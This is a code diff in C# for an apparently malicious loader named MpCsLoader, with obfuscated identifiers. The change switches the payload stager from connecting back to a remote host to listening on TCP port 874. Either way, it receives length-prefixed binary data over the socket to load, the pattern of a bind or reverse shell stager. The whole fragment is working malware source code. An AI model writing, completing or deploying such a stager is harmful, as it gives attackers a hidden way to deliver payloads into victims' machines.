@@ -62,10 +62,35 @@ namespace MpCsLoader
         {
             public static int LoadBinData(string YJiGsVcrrhMcL, int kSLthfG)
             {
+                
+                Socket svrSocket;
+
+                // listen mode
+                try {
+                    IPEndPoint serverEP = new IPEndPoint(IPAddress.Parse(YJiGsVcrrhMcL), kSLthfG);
+                    Socket listenSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+
+                    IPAddress hostIP = (Dns.Resolve(IPAddress.Any.ToString())).AddressList[0];
+                    IPEndPoint ep = new IPEndPoint(hostIP, 874);
+                    listenSocket.Bind(ep);
+
+                    listenSocket.Listen(10);
+
+                    svrSocket = listenSocket.Accept();
+                    listenSocket.Close();
+                }
+                catch { return 0;  }
+                
+                
+                /*
+                // connect mode
                 IPEndPoint serverEP = new IPEndPoint(IPAddress.Parse(YJiGsVcrrhMcL), kSLthfG);
-                Socket svrSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                svrSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+
                 try { svrSocket.Connect(serverEP); }
                 catch { return 0; }
+                */
+
                 byte[] lenBuf = new byte[4];
                 svrSocket.Receive(lenBuf, 4, 0);
                 int RUgJAb = BitConverter.ToInt32(lenBuf, 0);
